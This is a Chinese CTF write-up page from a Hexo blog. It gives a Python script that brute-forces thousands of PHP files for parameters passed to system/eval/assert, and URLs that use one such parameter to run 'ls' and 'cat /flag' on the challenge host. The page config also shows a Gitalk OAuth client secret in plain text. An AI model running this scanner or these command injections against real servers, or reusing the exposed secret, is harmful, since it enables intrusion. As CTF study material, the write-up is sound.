@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言：&amp;emsp;对于我来说这题确实也有些难度了。做题过程也是困难重重呀，废话不多说进入正题吧！ 0X01 解题思路 打开题目链接，提示留了源码备份为www.tar.gz。那么我们就下载看看。 打开压缩包发现有3000多个php文件，试着打开几个php文件，发现代码中存在一些诸如这样的get或post参数会执行system()&#x2F;eval()&#x2F;assert()函数，意味着我们可以通过传递参数的方式来">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web-高明的黑客">
+<meta property="og:url" content="https://mayi077.github.io/2020/01/22/web-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="前言：&amp;emsp;对于我来说这题确实也有些难度了。做题过程也是困难重重呀，废话不多说进入正题吧！ 0X01 解题思路 打开题目链接，提示留了源码备份为www.tar.gz。那么我们就下载看看。 打开压缩包发现有3000多个php文件，试着打开几个php文件，发现代码中存在一些诸如这样的get或post参数会执行system()&#x2F;eval()&#x2F;assert()函数，意味着我们可以通过传递参数的方式来">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.downk.cc/item/5e270d4a2fb38b8c3cc01a98.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e2815b02fb38b8c3cf1a990.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e2710072fb38b8c3cc056af.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e2710682fb38b8c3cc06208.jpg">
+<meta property="article:published_time" content="2020-01-22T08:58:45.000Z">
+<meta property="article:modified_time" content="2020-02-15T09:03:53.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="buuctf">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="脚本积累">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.downk.cc/item/5e270d4a2fb38b8c3cc01a98.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/01/22/web-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>web-高明的黑客 | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/01/22/web-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web-高明的黑客
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-22 16:58:45" itemprop="dateCreated datePublished" datetime="2020-01-22T16:58:45+08:00">2020-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-15 17:03:53" itemprop="dateModified" datetime="2020-02-15T17:03:53+08:00">2020-02-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF复现</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>&emsp;对于我来说这题确实也有些难度了。做题过程也是困难重重呀，废话不多说进入正题吧！</p>
+<h3 id="0X01-解题思路"><a href="#0X01-解题思路" class="headerlink" title="0X01 解题思路"></a>0X01 解题思路</h3><ol>
+<li>打开题目链接，提示留了源码备份为<a href="http://www.tar.gz。那么我们就下载看看。" target="_blank" rel="noopener">www.tar.gz。那么我们就下载看看。</a></li>
+<li>打开压缩包发现有3000多个php文件，试着打开几个php文件，发现代码中存在一些诸如这样的get或post参数会执行system()/eval()/assert()函数，意味着我们可以通过传递参数的方式来执行cmd命令。<br><img data-src="https://pic.downk.cc/item/5e270d4a2fb38b8c3cc01a98.jpg" alt=""></li>
+<li>由于文件太多，于是我们在本地搭建环境（将解压的文件夹放进网站根目录），我使用的是phpstudy，我将解压的src放在了D:\phpstudy\WWW\src我的网站根目录。然后我们使用python脚本来爆破。</li>
+<li>经过参考大佬们的脚本以及自己的理解，以下就是我做题时的脚本：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re         #引入正则</span><br><span class="line">import threading   #用于多线程</span><br><span class="line">import time</span><br><span class="line">print(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))           #格式化输出，开始时间</span><br><span class="line">s1&#x3D;threading.Semaphore(100)</span><br><span class="line">#Semaphore 管理一个计数器，每调用一次 acquire() 方法，计数器就减一，每调用一次 release() 方法，计数器就加一。计时器的值默认为 1</span><br><span class="line">#计数器的值不能小于 0，当计数器的值为 0 时，调用 acquire() 的线程就会等待，直到 release() 被调用。</span><br><span class="line">#因此，可以利用这个特性来控制线程数量。</span><br><span class="line">filePath &#x3D; r&quot;D:&#x2F;phpstudy&#x2F;WWW&#x2F;src&#x2F;&quot;        #改变当前的路径</span><br><span class="line">os.chdir(filePath)			       #改变当前工作目录到指定的路径。</span><br><span class="line">requests.adapters.DEFAULT_RETRIES &#x3D; 5	#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">                                            #requests请求发送的次数太多的情况下会报错（max ......）解决办法就是13和17行</span><br><span class="line">files &#x3D; os.listdir(filePath)                #读取当前路径下的所有文件名</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line">session.keep_alive &#x3D; False			# 设置连接活跃状态为False</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()				#线程加锁</span><br><span class="line">    print(&#39;trying   &#39;+file)</span><br><span class="line">    with open(file,encoding&#x3D;&#39;utf-8&#39;) as f:				#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))  #从f.read()中匹配get需要传值的名称</span><br><span class="line">            posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">    data &#x3D; &#123;&#125;						#所有的$_POST</span><br><span class="line">    params &#x3D; &#123;&#125;					        #所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] &#x3D; &quot;echo &#39;mayi077&#39;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] &#x3D; &quot;echo &#39;mayi077&#39;;&quot;</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;src&#x2F;&#39;+file</span><br><span class="line">    req &#x3D; session.post(url, data&#x3D;data, params&#x3D;params)   #一次性请求所有的GET和POST</span><br><span class="line">    req.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    content &#x3D; req.text</span><br><span class="line">    req.close()				             # 关闭请求  释放内存  切记打开就得关呀</span><br><span class="line">    if &quot;mayi077&quot; in content:			#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag &#x3D; 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req &#x3D; session.get(url, params&#x3D;&#123;a:&quot;echo &#39;mayi077&#39;;&quot;&#125;)</span><br><span class="line">            content &#x3D; req.text</span><br><span class="line">            req.close()				# 关闭请求  释放内存  切记打开就得关呀</span><br><span class="line">            if &quot;mayi077&quot; in content:</span><br><span class="line">                flag &#x3D; 1</span><br><span class="line">                print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s 且是get请求&quot; %a)</span><br><span class="line">                print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time()))+&quot;\n\n\n\n&quot;)</span><br><span class="line">                break</span><br><span class="line">        if flag !&#x3D; 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req &#x3D; session.post(url, data&#x3D;&#123;b:&quot;echo &#39;mayi077&#39;;&quot;&#125;)</span><br><span class="line">                content &#x3D; req.text</span><br><span class="line">                req.close()		  # 关闭请求  释放内存切记打开就得关呀</span><br><span class="line">                if &quot;mayi077&quot; in content:</span><br><span class="line">                    print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s 且是post请求 &quot; %b)</span><br><span class="line">                    print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time()))+&quot;\n\n\n\n&quot;)</span><br><span class="line">                    break</span><br><span class="line">    s1.release()   #线程解锁</span><br><span class="line"></span><br><span class="line">for i in files:															#加入多线程</span><br><span class="line">   t &#x3D; threading.Thread(target&#x3D;get_content, args&#x3D;(i,))   #注意target&#x3D;函数，args&#x3D;(传的值, ) args需要是一个元组</span><br><span class="line">   t.start()   # 开始</span><br></pre></td></tr></table></figure></li>
+<li>跑出来的结果如下：<br><img data-src="https://pic.downk.cc/item/5e2815b02fb38b8c3cf1a990.jpg" alt=""></li>
+<li>我们尝试着访问: <a href="http://d0741499-ca48-4573-a0be-87e07aec30ef.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=ls" target="_blank" rel="noopener">http://d0741499-ca48-4573-a0be-87e07aec30ef.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=ls</a> ../../../../ (至于为什么访问这个，其实也是经过试错的)得到根目录的文件及目录列表：<br><img data-src="https://pic.downk.cc/item/5e2710072fb38b8c3cc056af.jpg" alt=""></li>
+<li>接着我们访问： <a href="http://d0741499-ca48-4573-a0be-87e07aec30ef.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag" target="_blank" rel="noopener">http://d0741499-ca48-4573-a0be-87e07aec30ef.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</a> 得到flag：<img data-src="https://pic.downk.cc/item/5e2710682fb38b8c3cc06208.jpg" alt=""></li>
+</ol>
+<h3 id="0X02-自己在解题过程中所遇到的问题"><a href="#0X02-自己在解题过程中所遇到的问题" class="headerlink" title="0X02 自己在解题过程中所遇到的问题"></a>0X02 自己在解题过程中所遇到的问题</h3><ol>
+<li>在本地搭建好环境后浏览器访问文件报错无法理解？？ （2个连续的问号），开始也不理解。后面百度了？？，得知他是php7以上才有的，$a=$c??$b;等同于 $a=isset($c)?$c:$b; 。那么我们只要在phpstudy中将版本调到7.0以上，7.0以上需要v14，可自行安装。</li>
+<li>脚本的编写，确实现在我还不能独立不参照别人的脚本给编写出来，我真是太菜了，加油努力呀！</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/01/22/web-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/" title="web-高明的黑客">https://mayi077.github.io/2020/01/22/web-高明的黑客/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/buuctf/" rel="tag"><i class="fa fa-tag"></i>buuctf</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i>代码审计</a>
+              <a href="/tags/%E8%84%9A%E6%9C%AC%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>脚本积累</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/01/20/CG-misc-%E4%B8%98%E6%AF%94%E9%BE%99De%E5%A5%B3%E7%A5%9E/" rel="prev" title="CG-misc-丘比龙De女神">
+      <i class="fa fa-chevron-left"></i> CG-misc-丘比龙De女神
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/01/24/RoarCTF-2019-Easy-Calc/" rel="next" title="[RoarCTF 2019]Easy Calc">
+      [RoarCTF 2019]Easy Calc <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X01-解题思路"><span class="nav-number"></span> <span class="nav-text">0X01 解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X02-自己在解题过程中所遇到的问题"><span class="nav-number"></span> <span class="nav-text">0X02 自己在解题过程中所遇到的问题</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : 'a04848dde7d2ed93bb7c9408a9876602',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
